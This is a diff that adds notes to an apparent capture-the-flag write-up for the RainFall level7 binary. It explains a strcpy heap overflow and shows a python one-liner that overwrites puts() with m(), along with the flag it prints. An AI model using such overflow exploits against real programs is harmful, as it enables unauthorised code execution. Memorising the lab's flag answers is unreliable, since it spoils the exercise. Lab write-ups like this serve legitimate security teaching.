@@ -133,7 +133,7 @@ undefined4 main(undefined4 param_1,int param_2)
   undefined4 *puVar1;
   void *pvVar2;
   undefined4 *puVar3;
-  FILE *__stream;
+  FILE *__stream; 
   
   puVar1 = (undefined4 *)malloc(8);
   *puVar1 = 1;
@@ -182,11 +182,25 @@ level7@RainFall:~$
 
 The binary segfault when it doesn't have at least 2 argument we see.
 
+It is using strcpy on argv[1] and argv[2], since its param + 4 and param + 8
 
 After a long analysis, the binary open the flag file, and read it using fgets and store it in the variable 'c'.
 
 It might a global variable, and its actually readen in the 'm' function, so we have to call it, lets try doing that firstly.
 
+
+The offset should be not that high to overwrite an andress, since all it does is strcpy on argv1 and 2.
+
+We are going to overwrite puts() function with the m() function.
+
+
+
+
 ```sh
+./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08' + ' ' + '\xf4\x84\x04\x08' ")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1675975942
 
 ```
+
+And we get our flag
